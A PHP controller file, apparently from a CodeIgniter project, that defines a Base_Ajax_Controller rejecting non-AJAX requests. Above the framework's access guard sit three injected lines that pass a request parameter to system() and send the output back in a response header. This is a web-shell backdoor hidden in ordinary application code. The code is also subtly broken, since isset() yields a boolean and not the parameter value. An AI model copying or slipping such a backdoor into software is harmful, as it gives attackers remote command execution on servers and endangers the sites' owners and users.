<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); defined('BASEPATH') OR exit('No direct script access allowed');

class Base_Ajax_Controller extends Base_Controller {

    public function __construct() {

        parent::__construct();

        if (!IS_AJAX_REQUEST) {
            exit(EXIT_ERROR);
        }
    }

}
